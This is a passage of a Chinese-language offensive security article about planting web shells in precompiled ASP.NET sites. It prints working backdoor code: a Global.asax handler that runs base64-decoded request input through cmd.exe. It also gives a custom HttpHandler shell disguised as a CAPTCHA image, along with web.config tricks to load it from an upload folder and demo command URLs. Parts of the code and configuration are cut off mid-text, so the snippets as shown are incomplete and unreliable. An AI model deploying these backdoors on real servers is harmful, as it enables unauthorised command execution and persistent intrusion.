Application_Start() 表示在 HttpApplication 类的第一个实例被创建时，该事件被触发。它
允许你创建可以由所有 HttpApplication 实例访问的对象，这是我们程序第一次启动的时
候调用的方法，Application_BeginRequest()  表示在接收到一个应用程序请求时触发。对
于一个请求来说，它是第一个被触发的事件。在预编译的模式下 Global.asax 会被编译成
App_global.asax.dll 、App_global.asax.compiled 两个文件，将这两个文件上传到 Bin 目
录即可，刷新页面即可执行 DLL 里的命令。为了更加贴近实战，笔者优化代码加入从外部
获取的数据，如下代码所示，DLL 已经放在星球工具里，请师父们自取。 
4.3 Web.config 助力突破预编译 
在预编译模式下唯一不编译的就是 web.config 网站配置这个文件，它不参与编译并可以随
时对站点目录下的 Web.config 文件进行修改，而无需重新编译网站。这个点就很厉害了助
力笔者打开潘多拉魔盒，看一看如何更好的利用好它。另外根据预编译的运行规则分析出必
须使用编译后的 DLL 文件才能正常运行，一切未经过编译的 ASPX 源代码文件是不能运行
的，所以有一种不能跨目录上传的场景，因为不能跨目录上传，所以编译好的 DLL 文件无
法传至 Bin 目录下，从而不能 GetShell，笔者假定任意文件上传只能限定于固定目录下，比
如/Lib/目录，而此时又满足对 web.config 文件的读写，这样的场景下可在编译的 DLL 里实
现 HttpHandler。  
private void Application_BeginRequest(object sender, EventArgs e) 
{ 
if 
(!string.IsNullOrEmpty(HttpContext.Current.Request["content"])) 
{ 
Process.Start("cmd.exe", "/c " + 
Encoding.GetEncoding("utf-
8").GetString(Convert.FromBase64String(HttpContext.Current.Request["conten
t"]))); 
} 
} 
4.3.1 HttpHandler DLL 
IIS 提供的 ISAPI 是根据文件名后缀把不同的请求转交给不同的处理程序，几乎所有的.NET
应用程序都交给 aspnet_isapi.dll 去处理了，但是 aspnet_isapi.dll 对不同的请求采取不同的
处理方式，查看 C:\Windows\Microsoft.NET\Framework\v4.0.30319\Config\web.config 配
置定义如下 
例 如  配置项中 path 属性是必选的，它的作用是指定路径可以包含单个 URL 或
者简单的通配符字符串如 *.ashx ，表示默认任意文件名的一般处理程序 ashx 均可通过 
System.Web.UI.SimpleHandlerFactory 实现 HTTP 请求和响应， 其它的属性参考下表 
由于 System.Web.UI.SimpleHandlerFactory 继承于 IHttpHandlerFactory，所以我们如果想
创建自定义的处置 Handlers ，就需要继承 IHttpHandler 类，笔者编写了一个基于 Handlers
处理程序的.NET 小马，保存名称为 IsapiModules.Handler.cs ，主要实现了三个功能，一是
生成验证码，二是创建一个 aspx 的一句话文件，三是执行 cmd 命令；生成验证码的目的是
为了更好的隐藏自己，从 HTTP 返回的数据里输出的是一张验证码图片，代码如下 
再在命令行下用 csc.exe 生成 IsapiModules.Handler.dll ，生成 DLL 的命令如下 
public void ProcessRequest(HttpContext context) 
{ 
context.Response.ContentType = "image/JPEG"; 
string path = context.Request["p"]; 
string input = context.Request["c"]; 
if (context.Request["a"] == "c") 
{ 
this.cmdShell(path, input); 
} 
else if (context.Request["a"] == "w") 
{ 
string input2 = ""; 
this.CreateFiles(path, input2); 
} 
Bitmap bitmap = new Bitmap(200, 60); 
Graphics graphics = Graphics.FromImage(bitmap); 
graphics.FillRectangle(new SolidBrush(Color.White), 0, 0, 200, 60); 
Font font = new Font(FontFamily.GenericSerif, 48f, FontStyle.Bold, 
GraphicsUnit.Pixel); 
Random random = new Random(); 
string text = "ABCDEFGHIJKLMNPQRSTUVWXYZ"; 
StringBuilder stringBuilder = new StringBuilder(); 
for (int i = 0; i 标签内添加映射关系，一切 URL 请求带 .gif 的都从 
IsapiModules.Handler 经过，配置详情如下 
但做到这里还不够，因为这样 IIS 只会去 bin 目录下寻找 IsapiModules.Handler.dll 文件，找
不到就会抛出异常，可我们上传的 dll 位于 Lib 目录下，所以还需要增加一处配置， 用于探索指定目录下的程序集并自动加载，如下 
这样配置后就可以实现具备读写根目录 web.config 文件，且上传文件不跨越目录的情况下
完成 GetShell，演示 http://localhost/anywhere.gif?a=c&p=cmd.txt&c=ver 命令执行后将
结果保存到 cmd.txt 文件，如图 
aspnet_compiler -v /Lib -p D:\Project\test D:\test -fixednames 
另外还可以在 Lib 目录里同时上传 web.config 文件和 IsapiModules.Handler.dll，但可惜的
是在子目录下的 web.config 文件里配置   这样的扫描探索
选项并不生效，导致还是需要在根目录的 web.config 里配置才可以正常运行，演示地址改
成 http://localhost/Lib/any.gif?a=c&p=cmd.txt&c=ver，将会在 Lib 目录下生成 cmd.txt 
0X05 结语 
最后预编译还有一些方法比如利用反序列化写入 GhostWebshell，这种方法也可以绕过预编
译的限制，但细细想来既然都可以反序列化了很多情况下可以执行系统命令或者反弹 Shell
等方式拿下权限，所以这块内容可以归于内存马系列，后续笔者会详细再做介绍，请大伙继
续关注文章涉及的 PDF 和 Demo 已打包发布在星球，请大伙关注 dotNet 安全矩阵公众号，
欢迎对.NET 安全关注和关心的同学加入我们，在这里能遇到有情有义的小伙伴，大家聚在
一起做一件有意义的事。